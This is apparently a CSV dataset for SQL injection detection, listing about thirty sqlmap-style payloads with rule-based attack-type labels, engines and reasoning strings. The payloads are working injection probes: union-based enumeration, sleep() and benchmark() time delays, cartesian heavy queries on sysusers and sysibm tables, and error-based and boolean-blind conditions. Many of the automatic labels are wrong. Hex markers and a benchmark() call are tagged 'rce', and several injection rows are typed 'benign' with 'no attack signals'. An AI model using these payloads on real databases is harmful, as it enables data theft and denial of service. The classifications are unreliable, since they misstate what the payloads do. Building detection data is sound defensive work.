row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5550,"1"" ) where 9020 = 9020 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
5551,"1 ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5552,"-9606%"" ) ) ) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5553,"-3498"" ) ) as xbvb where 2056 = 2056 union all select 2056,2056,2056,2056,2056,2056,2056--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5554,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'tfso' = 'tfso",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5555,"1' in boolean mode ) or elt ( 6272 = 6272,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5556,"1 and elt ( 4249 = 4249,7259 ) # lwyo",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5557,"1"" ) as semi where 4260 = 4260",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5558,1' ) ) as qswu where 6377 = 6377,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5559,"1%"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5560,"-9496 ) ) ) or elt ( 7511 = 3951,3951 ) and ( ( ( 3514 = 3514",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5561,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",1,,boolean_blind,generic,0.95,4532 = 4532 or detected — boolean_blind injection (priority 8) on generic,rule-based
5562,"1"" ) where 8254 = 8254 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,8254 = 8254 and detected — boolean_blind injection (priority 8) on generic,rule-based
5563,"1 ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5564,select case when 5894 = 4052 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5565,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( 4537 = 4537",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5566,"1%"" ) and make_set ( 9956 = 1060,1060 ) and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5567,1%' and sleep ( 5 ) and '%' = ',1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5568,"1"" or sleep ( 5 ) and ""telb"" = ""telb",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5569,1%' ) and ( 3020 = 3020 ) *6703 and ( '%' = ',1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5570,"-1187' ) union all select 8202,8202,8202,8202,8202,8202,8202#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5571,"-6249' ) ) ) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5572,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
5573,"1' ) where 1625 = 1625 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5574,1%' rlike ( select ( case when ( 3596 = 4245 ) then 1 else 0x28 end ) ) and '%' = ',1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
5575,"1 ) ) union all select null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5576,"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5577,1 ) where 8041 = 8041,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5578,"1"" or sleep ( 5 )",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5579,1 ) as sglv where 7676 = 7676,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
